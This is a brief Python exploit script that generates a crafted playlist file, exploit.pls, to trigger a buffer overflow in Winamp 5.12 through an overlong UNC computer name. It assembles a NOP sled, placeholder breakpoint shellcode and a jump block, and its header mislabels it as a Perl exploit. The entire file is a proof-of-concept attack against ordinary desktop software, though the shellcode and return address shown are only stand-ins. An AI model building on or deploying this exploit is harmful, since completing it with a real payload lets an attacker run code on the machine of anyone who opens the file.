#!/usr/bin/env python
# ====================================================================
# Winamp 5.12 Playlist UNC Path Computer Name Overflow Perl Exploit
# Original Poc by Umesh Wanve (umesh_345@yahoo.com)
# ==================================================================== 
start="[playlist]\r\nFile1=\\\\"
nop="\x90" * 856
shellcode ="\xcc" * 166
jmp="\x41\x41\x41\x41"+"\x83\x83\x83\x83\x83\x83\x83\x83"+"\x90\x90\x90\x90"
end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"

f = open('exploit.pls', 'w')
f.write(start + nop + shellcode + jmp + end)
f.close()
